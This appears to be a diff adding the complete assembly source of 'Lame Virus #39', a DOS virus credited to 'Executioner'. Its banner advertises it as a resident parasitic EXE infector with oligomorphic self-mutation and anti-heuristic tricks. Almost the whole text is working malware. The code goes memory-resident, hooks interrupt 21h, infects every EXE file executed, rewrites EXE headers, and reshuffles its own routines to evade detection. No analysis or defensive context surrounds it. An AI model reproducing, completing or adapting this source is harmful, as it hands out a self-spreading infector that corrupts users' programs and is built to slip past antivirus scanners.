@@ -1,0 +1,530 @@
+Lame Virus #39
+Executioner
++------------------------------------------------------------------------------+
+| Lame Virus #39							       |
+| by Executioner							       |
+|									       |
+|   o resident parasitic EXE infector					       |
+|   o pads EXE files to nearest paragraph boundary			       |
+|   o oligomorphic							       |
+|   o sort of interesting function dispatcher				       |
+|   o mild anti-heuristic code						       |
++------------------------------------------------------------------------------+
+
+.model	medium
+.386
+
+; these are the constants that are pushed as arguments to the task switching
+; mechanism
+
+task_infect_file equ 0
+task_go_resident equ 1
+task_check_residency equ 2
+task_new_int21 equ 3
+task_save_all equ 4
+task_load_all equ 5
+task_seek_sof equ 6
+task_seek_eof equ 7
+task_read_file equ 8
+task_close_file equ 9
+task_write_file equ 10
+task_do_int21 equ 11
+task_open_file equ 12
+task_ret_exe equ 13
+task_mutate equ 14
+
+v_length equ v_finish-v_start		; the number of bytes to write
+m_length equ m_finish-v_start		; the amount of bytes in memory
+num_para equ (m_length+15)/16		; the amount of memory to allocate
+
+cseg	segment use16
+	assume	cs:cseg,ds:cseg,es:cseg,ss:cseg
+	org	0
+v_start:
+; call all the necessary procedures to installing a virus in memory and
+; returning to the host file.
+	mov	cs:[save_depth], 0
+	push	task_check_residency
+	call	word ptr cs:[call_task_l]
+	jz	return
+	push	task_save_all
+	call	word ptr cs:[call_task_l]
+	push	task_go_resident
+	call	word ptr cs:[call_task_l]
+	push	task_load_all
+	call	word ptr cs:[call_task_l]
+return:
+	push	task_ret_exe
+	call	word ptr cs:[call_task_l]
+
+;------------------------------------------------------------------------------
+;THE FUNCTION DISPATCHER
+;------------------------------------------------------------------------------
+
+; this procedure takes an argument passed on the stack and calls the requested
+; procedure, based on where it's located according to the task table.
+
+call_task:
+	push	bp
+	push	bx
+	mov	bp, sp
+	mov	bx, [bp+6]
+	shl	bx, 2
+	mov	bx, word ptr cs:[task_table+bx]
+	mov	cs:[location], bx
+	pop	bx
+	pop	bp
+	call	word ptr cs:[location]
+	retn	2
+
+;------------------------------------------------------------------------------
+;STATICALLY LOCATED VARIABLES
+;------------------------------------------------------------------------------
+
+location	dw	?
+old_int21	dd	?
+save_depth	dw	?
+seed	dw	?
+rem	dw	?
+call_task_l dw	offset call_task
+get_table db 20 dup (0)
+
+;------------------------------------------------------------------------------
+;THE LOCATION TABLE FOR THE RELOCATABLE ELEMENTS
+;------------------------------------------------------------------------------
+
+task_table:
+	dw	offset infect_file, infect_file_len
+	dw	offset go_resident, go_resident_len
+	dw	offset check_residency, check_residency_len
+	dw	offset new_int21, new_int21_len
+	dw	offset save_all, save_all_len
+	dw	offset load_all, load_all_len
+	dw	offset seek_sof, seek_sof_len
+	dw	offset seek_eof, seek_eof_len
+	dw	offset read_file, read_file_len
+	dw	offset close_file, close_file_len
+	dw	offset write_file, write_file_len
+	dw	offset do_int21, do_int21_len
+	dw	offset open_file, open_file_len
+	dw	offset ret_exe, ret_exe_len
+	dw	offset mutate, mutate_len
+
+;------------------------------------------------------------------------------
+;BLOCK SWAPPING ROUTINE
+;------------------------------------------------------------------------------
+
+mutate:
+	push	task_save_all
+	call	word ptr cs:[call_task_l]
+	mov	[rem], 15
+	mov	di, offset get_table
+	mov	al, 0
+	mov	cx, 15
+	rep	stosb
+	mov	di, offset o_buffer
+	mov	cx, 15
+	mov	dx, offset mutate	; initial location
+entry_l:
+	push	cx
+	call	get_entry
+; returns with BX=entry number, AX=length,SI=location
+	shl	bx, 2
+	mov	[bx+new_task_table], dx ; store location
+	add	dx, ax			; get next location
+	mov	[bx+new_task_table+2], ax ; store length
+	mov	cx, ax			; copy function
+	rep	movsb
+	pop	cx
+	loop	entry_l
+
+	push	task_load_all
+	call	word ptr cs:[call_task_l]
+	retn
+get_entry:
+	push	cx
+	push	dx
+get_another:
+	call	random
+	and	ax, 0fh
+	cmp	ax, 14
+	ja	get_another
+	mov	bx, ax
+	cmp	byte ptr [bx+get_table], 0
+	jnz	get_another
+	mov	byte ptr [bx+get_table], 1
+	shl	bx, 2
+	mov	si, word ptr [task_table+bx]
+	mov	ax, word ptr [task_table+bx+2]
+	shr	bx, 2
+	pop	dx
+	pop	cx
+	retn
+random:
+	push	cx
+	push	dx
+	in	al, 40h
+	xor	[seed], ax
+	mov	ax, [seed]
+	mov	cx, 12345
+	mul	cx
+	add	ax, 12345
+	mov	[seed], ax
+	pop	dx
+	pop	cx
+	retn
+mutate_len equ $-mutate
+
+;------------------------------------------------------------------------------
+;CODE TO RETURN TO THE HOST PROGRAM
+;------------------------------------------------------------------------------
+
+; we're going to manually set the SS/SP/CS/IP, so we don't need to worry
+; about cleaning up the stack from what the task dispatcher was doing.
+
+ret_exe:
+	mov	ax, ds
+	add	ax, 10h
+	call	delta
+delta:
+	pop	bp
+	sub	bp, offset delta
+	add	word ptr cs:[bp+old_cs], ax
+	add	word ptr cs:[bp+old_ss], ax
+	mov	ss, word ptr cs:[bp+old_ss]
+	mov	sp, word ptr cs:[bp+old_sp]
+	db	0eah
+old_ip	dw	?
+old_cs	dw	?
+old_ss	dw	?
+old_sp	dw	?
+ret_exe_len equ $-ret_exe
+
+;------------------------------------------------------------------------------
+;CODE TO GO RESIDENT AND HOOK INTERRUPT 21H
+;------------------------------------------------------------------------------
+
+go_resident:
+	push	ds
+	push	es
+	mov	ax, ds
+	dec	ax
+	mov	ds, ax
+; remove some memory from the host process so we can slide the virus in
+; above it.
+	sub	di, di			; simple anti-heuristic
+	mov	byte ptr ds:[di], 'Z'
+	add	di, 3
+	sub	word ptr ds:[di], num_para+1
+	add	di, 12h-3
+	sub	word ptr ds:[di], num_para+1
+	mov	ax, word ptr ds:[di]
+	mov	ds, ax
+	inc	ax
+	mov	es, ax
+; build a new MCB with DOS as the owner
+	sub	di, di
+	mov	byte ptr ds:[di], 'Z'
+	inc	di
+	mov	word ptr ds:[di], 8
+	mov	word ptr ds:[di+2], num_para
+	push	cs
+	pop	ds
+	sub	di, di			; zero DI
+	mov	si, di
+	push	si			; save a 0 on the stack
+	mov	cx, v_length		; move v_length bytes into the
+	rep	movsb			; newly allocated memory
+	pop	ds			; DS=0
+	mov	si, 84h 		; copy the original handler address
+	mov	di, offset old_int21
+	movsw
+	movsw
+	mov	bx, task_new_int21	; get the relocated address of the
+	shl	bx, 2			; virus' int 21 handler
+	mov	ax, word ptr cs:[task_table+bx]
+	mov	bx, 84h
+	cli				; disable interrupts
+	mov	word ptr ds:[bx], ax   ; set the new address in the IVT
+	mov	word ptr ds:[bx+2], es
+	sti				; enable interrupts
+	pop	es
+	pop	ds
+	retn
+go_resident_len equ $-go_resident
+
+check_residency:
+	mov	ax, 6e00h
+	add	ax, 42ffh-6e00h
+	int	21h
+	cmp	bx, 42feh
+	retn
+check_residency_len equ $-check_residency
+
+save_all:
+	push	bx
+	push	bx
+	mov	bx, cs:[save_depth]
+	shl	bx, 5
+	mov	word ptr cs:[bx+save_reg], ax
+	pop	ax
+	mov	word ptr cs:[bx+save_reg+2], ax
+	mov	word ptr cs:[bx+save_reg+4], cx
+	mov	word ptr cs:[bx+save_reg+6], dx
+	mov	word ptr cs:[bx+save_reg+8], si
+	mov	word ptr cs:[bx+save_reg+0ah], di
+	mov	word ptr cs:[bx+save_reg+0ch], bp
+	mov	word ptr cs:[bx+save_reg+0eh], ds
+	mov	word ptr cs:[bx+save_reg+10h], es
+	pushf
+	pop	word ptr cs:[bx+save_reg+12h]
+	pop	bx
+	inc	cs:[save_depth]
+	retn
+save_all_len equ $-save_all
+
+load_all:
+	dec	cs:[save_depth]
+	mov	bx, cs:[save_depth]
+	shl	bx, 5
+	mov	ax, word ptr cs:[bx+save_reg]
+	mov	cx, word ptr cs:[bx+save_reg+4]
+	mov	dx, word ptr cs:[bx+save_reg+6]
+	mov	si, word ptr cs:[bx+save_reg+8]
+	mov	di, word ptr cs:[bx+save_reg+0ah]
+	mov	bp, word ptr cs:[bx+save_reg+0ch]
+	mov	ds, word ptr cs:[bx+save_reg+0eh]
+	mov	es, word ptr cs:[bx+save_reg+10h]
+	push	word ptr cs:[bx+save_reg+12h]
+	popf
+	mov	bx, word ptr cs:[bx+save_reg+2]
+	retn
+load_all_len equ $-load_all
+
+;------------------------------------------------------------------------------
+;FILE INFECTION ROUTINE
+;------------------------------------------------------------------------------
+
+infect_file:
+; save all registers
+	mov	cs:[save_depth], 0
+	push	task_save_all
+	call	word ptr cs:[call_task_l]
+; open the file, r/w
+	push	task_open_file
+	call	word ptr cs:[call_task_l]
+; put the file handle in BX
+	xchg	bx, ax
+; set DS to the virus segment
+	push	cs
+	pop	ds
+	push	cs
+	pop	es
+; read the EXE header
+	mov	cx, 1ah
+	mov	dx, offset s_buffer
+	push	task_read_file
+	call	word ptr cs:[call_task_l]
+; save data
+	mov	si, offset s_buffer+14h
+	mov	di, word ptr ds:[task_table+task_ret_exe*4]
+	add	di, offset old_ip-offset ret_exe
+	movsw
+	movsw
+	mov	si, offset s_buffer+0eh
+	movsw
+	lodsw
+	cmp	ax, 4000h
+	jz	already_infected
+	stosw
+; seek eof
+	push	task_seek_eof
+	call	word ptr cs:[call_task_l]
+; pad file
+	mov	cx, 10h
+	and	ax, 0fh
+	sub	cx, ax
+	and	cx, 0fh
+	push	task_write_file
+	call	word ptr cs:[call_task_l]
+; seek eof
+	push	task_seek_eof
+	call	word ptr cs:[call_task_l]
+	; calculate new CS:IP/SS:SP
+	shr	ax, 4
+	shl	dx, 12
+	or	ax, dx
+	sub	ax, word ptr [s_buffer+8]
+	mov	[s_buffer+14h], 0
+	mov	[s_buffer+16h], ax
+	inc	ax
+	mov	[s_buffer+0eh], ax
+	mov	[s_buffer+10h], 4000h
+; mutate
+	push	task_mutate
+	call	word ptr cs:[call_task_l]
+; write oligmorphic header to host
+	mov	cx, offset task_table
+	mov	dx, offset v_start
+	push	task_write_file
+	call	word ptr cs:[call_task_l]
+; write task table
+	mov	cx, offset mutate-offset task_table
+	mov	dx, offset new_task_table
+	push	task_write_file
+	call	word ptr cs:[call_task_l]
+; write virus body
+	mov	cx, offset v_finish-mutate
+	mov	dx, offset o_buffer
+	push	task_write_file
+	call	word ptr cs:[call_task_l]
+; seek eof
+	push	task_seek_eof
+	call	word ptr cs:[call_task_l]
+; calculate file pages/page remainder
+	mov	cx, ax
+	and	cx, 1ffh
+	shr	ax, 9
+	shl	dx, 7
+	or	ax, dx
+	inc	ax
+	mov	word ptr [s_buffer+4], ax
+	mov	word ptr [s_buffer+2], cx
+	add	word ptr [s_buffer+0ah], 500h
+; seek start
+	push	task_seek_sof
+	call	word ptr cs:[call_task_l]
+; write modified header
+	mov	cx, 1ah
+	mov	dx, offset s_buffer
+	push	task_write_file
+	call	word ptr cs:[call_task_l]
+already_infected:
+; close file
+	push	task_close_file
+	call	word ptr cs:[call_task_l]
+; restore changed registers
+	push	task_load_all
+	call	word ptr cs:[call_task_l]
+	retn
+infect_file_len equ $-infect_file
+
+;------------------------------------------------------------------------------
+;SUPPORT ROUTINES
+;------------------------------------------------------------------------------
+
+; read CX bytes into DS:DX from the current handle
+read_file:
+	mov	ah, 3fh
+	push	task_do_int21
+	call	word ptr cs:[call_task_l]
+	retn
+read_file_len equ $-read_file
+
+; close the current handle
+close_file:
+	mov	ah, 3eh
+	push	task_do_int21
+	call	word ptr cs:[call_task_l]
+	retn
+close_file_len equ $-close_file
+
+; write CX bytes from DS:DX to the current handle at the current position
+write_file:
+	mov	ah, 40h
+	push	task_do_int21
+	call	word ptr cs:[call_task_l]
+	retn
+write_file_len equ $-write_file
+
+; seek to the end of the file
+seek_eof:
+	mov	ax, 4202h
+	sub	cx, cx
+	cwd
+	push	task_do_int21
+	call	word ptr cs:[call_task_l]
+	retn
+seek_eof_len equ $-seek_eof
+
+; seek to the start of the file
+seek_sof:
+	mov	ax, 4200h
+	sub	cx, cx
+	cwd
+	push	task_do_int21
+	call	word ptr cs:[call_task_l]
+	retn
+seek_sof_len equ $-seek_sof
+
+; open a file in read/write mode
+open_file:
+	mov	ax, 3d02h
+	int	21h
+	retn
+open_file_len equ $-open_file
+
+; call the original interrupt 21h address
+do_int21:
+	pushf
+	call	dword ptr cs:[old_int21]
+	retn
+do_int21_len equ $-do_int21
+
+;------------------------------------------------------------------------------
+;THE NEW INTERRUPT 21H HANDLER
+;------------------------------------------------------------------------------
+
+new_int21:
+	pushf
+	cmp	ax, 42ffh
+	jnz	not_inst_check
+	mov	bx, 42feh
+	popf
+	iret
+not_inst_check:
+	xor	ax, 1234
+	cmp	ax, 4b00h xor 1234
+	pushf
+	xor	ax, 1234
+	popf
+	jnz	not_exec_call
+	push	task_infect_file
+	call	word ptr cs:[call_task_l]
+
+not_exec_call:
+	popf
+	jmp	dword ptr cs:[old_int21]
+new_int21_len equ $-new_int21
+
+v_finish:
+save_reg	dw	4*0fh dup (?)
+s_buffer	dw	(1ah/2) dup (?)
+new_task_table	dw	20h dup (?)
+o_buffer	db	v_length dup (?)
+m_finish:
+cseg	ends
+
+init	segment use16
+	assume	cs:init,ds:init
+	org	0
+i_start:
+	mov	bx, seg init
+	mov	ax, ds
+	sub	bx, ax
+	sub	bx, 10h
+	mov	ax, seg cseg
+	mov	ds, ax
+	assume	ds:cseg
+	mov	[old_cs], bx
+	mov	[old_ip], offset i_cont
+	mov	[old_ss], bx
+	mov	[old_sp], 4000h
+	push	es
+	pop	ds
+	jmp	far ptr cseg:v_start
+i_cont:
+	mov	ax, 4c00h
+	int	21h
+init	ends
+	end	i_start
